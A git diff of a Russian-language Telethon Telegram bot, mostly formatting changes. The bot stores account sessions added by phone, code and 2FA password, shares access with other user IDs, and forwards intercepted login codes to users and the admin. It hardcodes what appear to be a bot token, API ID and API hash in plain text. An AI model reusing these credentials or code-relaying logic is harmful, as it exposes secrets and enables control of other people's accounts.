@@ -14,7 +14,7 @@ from telethon.errors import (
 from typing import Optional, List, Dict
 
 # Конфигурация
-BOT_TOKEN = "8673958694:AAHLL0nZWo1hEci1Sx3gX0J1IKtEbNejqbo"
+BOT_TOKEN = "8799691245:AAH-dX7S93l69NRKz_m43xAONQHTghJH9UM"
 ADMIN_ID = 7634532827
 API_ID = 38770442
 API_HASH = "c5b30003cf1e18652ec1d4f8ffc666c7"
@@ -25,7 +25,6 @@ logging.basicConfig(
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
-
 
 # Класс базы данных
 class Database:
@@ -210,7 +209,6 @@ class Database:
             )
             await db.commit()
 
-
 # Класс для управления сессиями
 class SessionManager:
     def __init__(self, db):
@@ -237,8 +235,7 @@ class SessionManager:
     async def add_session(self, phone: str, session_string: str = None, password: str = None):
         """Добавление новой сессии (только для админа)"""
         try:
-            client = TelegramClient(StringSession(session_string) if session_string else StringSession(), API_ID,
-                                    API_HASH)
+            client = TelegramClient(StringSession(session_string) if session_string else StringSession(), API_ID, API_HASH)
             await client.connect()
 
             if session_string:
@@ -445,7 +442,7 @@ class SessionManager:
             del self.active_requests[request_id]
 
             # Отправляем уведомление пользователю
-            codes_text = "\n".join([f"🔢 Код {i + 1}: `{code}`" for i, code in enumerate(codes_received)])
+            codes_text = "\n".join([f"🔢 Код {i+1}: `{code}`" for i, code in enumerate(codes_received)])
             await self.bot.send_message(
                 user_id,
                 f"✅ *Вход подтвержден!*\n\n"
@@ -507,8 +504,7 @@ class SessionManager:
             )
 
             # Отправляем уведомление админу
-            codes_text = "\n".join([f"🔢 Код {i + 1}: `{code}`" for i, code in
-                                    enumerate(codes_received)]) if codes_received else "Коды не получены"
+            codes_text = "\n".join([f"🔢 Код {i+1}: `{code}`" for i, code in enumerate(codes_received)]) if codes_received else "Коды не получены"
             await self.bot.send_message(
                 ADMIN_ID,
                 f"❌ *Вход отклонен*\n\n"
@@ -549,7 +545,6 @@ class SessionManager:
             except:
                 pass
             del self.clients[phone]
-
 
 # Основной класс бота
 class SessionBot:
@@ -670,8 +665,7 @@ class SessionBot:
 
                         if session:
                             allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []
-                            is_connected = session['phone'] in self.session_manager.clients and \
-                                           self.session_manager.clients[session['phone']].is_connected()
+                            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()
 
                             text = (
                                 f"📱 *Управление доступом*\n\n"
@@ -711,8 +705,7 @@ class SessionBot:
 
                                 for uid in allowed_users:
                                     text += f"• ID: `{uid}`\n"
-                                    buttons.append(
-                                        [Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])
+                                    buttons.append([Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])
 
                                 buttons.append([Button.inline("🔙 Назад", data=f"session_{session_id}")])
                                 await event.edit(text, buttons=buttons, parse_mode='md')
@@ -737,8 +730,7 @@ class SessionBot:
 
                                 for uid in allowed_users:
                                     text += f"• ID: `{uid}`\n"
-                                    buttons.append(
-                                        [Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])
+                                    buttons.append([Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])
 
                                 buttons.append([Button.inline("🔙 Назад", data=f"session_{session_id}")])
                                 await event.edit(text, buttons=buttons, parse_mode='md')
@@ -915,8 +907,7 @@ class SessionBot:
                         result, message = await self.session_manager.verify_code(phone, code)
 
                         if result:
-                            await event.respond(
-                                "✅ Сессия успешно добавлена!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
+                            await event.respond("✅ Сессия успешно добавлена!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
                             del self.user_states[user_id]
                         elif message == "2fa_needed":
                             await event.respond("🔐 Требуется двухфакторная аутентификация. Введите пароль 2FA:")
@@ -933,8 +924,7 @@ class SessionBot:
                     result, message = await self.session_manager.verify_2fa(phone, password)
 
                     if result:
-                        await event.respond(
-                            "✅ Сессия успешно добавлена с 2FA!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
+                        await event.respond("✅ Сессия успешно добавлена с 2FA!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
                         del self.user_states[user_id]
                     else:
                         await event.respond(f"❌ Ошибка: {message}")
@@ -953,8 +943,7 @@ class SessionBot:
                         session = await self.db.get_session_by_id(session_id)
                         if session:
                             allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []
-                            is_connected = session['phone'] in self.session_manager.clients and \
-                                           self.session_manager.clients[session['phone']].is_connected()
+                            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()
 
                             text = (
                                 f"📱 *Управление доступом*\n\n"
@@ -991,13 +980,12 @@ class SessionBot:
             await event.respond("📋 Список сессий пуст")
             return
 
-        text = f"📋 *Список сессий* (стр. {page + 1}/{total_pages})\n\n"
+        text = f"📋 *Список сессий* (стр. {page+1}/{total_pages})\n\n"
 
         buttons = []
         for session in sessions:
             allowed = len(session['allowed_users'].split(',')) if session['allowed_users'] else 0
-            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[
-                session['phone']].is_connected()
+            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()
             status = "✅" if is_connected else "❌"
             monitoring = "👁️" if session.get('monitoring_active') else ""
             twofa = "🔐" if session['two_fa'] else ""
@@ -1008,12 +996,12 @@ class SessionBot:
 
         nav_buttons = []
         if page > 0:
-            nav_buttons.append(Button.inline("⬅️", data=f"admin_page_{page - 1}"))
+            nav_buttons.append(Button.inline("⬅️", data=f"admin_page_{page-1}"))
 
-        nav_buttons.append(Button.inline(f"📄 {page + 1}/{total_pages}", data="info"))
+        nav_buttons.append(Button.inline(f"📄 {page+1}/{total_pages}", data="info"))
 
         if page < total_pages - 1:
-            nav_buttons.append(Button.inline("➡️", data=f"admin_page_{page + 1}"))
+            nav_buttons.append(Button.inline("➡️", data=f"admin_page_{page+1}"))
 
         buttons.append(nav_buttons)
 
@@ -1039,7 +1027,7 @@ class SessionBot:
         end_idx = start_idx + per_page
         page_sessions = sessions[start_idx:end_idx]
 
-        text = f"📱 *Выберите аккаунт* (стр. {page + 1}/{total_pages})\n\n"
+        text = f"📱 *Выберите аккаунт* (стр. {page+1}/{total_pages})\n\n"
 
         buttons = []
         for session in page_sessions:
@@ -1061,12 +1049,12 @@ class SessionBot:
 
         nav_buttons = []
         if page > 0:
-            nav_buttons.append(Button.inline("⬅️", data=f"user_page_{page - 1}"))
+            nav_buttons.append(Button.inline("⬅️", data=f"user_page_{page-1}"))
 
-        nav_buttons.append(Button.inline(f"📄 {page + 1}/{total_pages}", data="info"))
+        nav_buttons.append(Button.inline(f"📄 {page+1}/{total_pages}", data="info"))
 
         if page < total_pages - 1:
-            nav_buttons.append(Button.inline("➡️", data=f"user_page_{page + 1}"))
+            nav_buttons.append(Button.inline("➡️", data=f"user_page_{page+1}"))
 
         buttons.append(nav_buttons)
         buttons.append([Button.inline("🔄 Обновить", data="refresh_user")])
@@ -1083,11 +1071,9 @@ class SessionBot:
             [Button.text("📊 Статистика")]
         ]
 
-
 async def main():
     bot = SessionBot()
     await bot.start()
-
 
 if __name__ == "__main__":
     try:
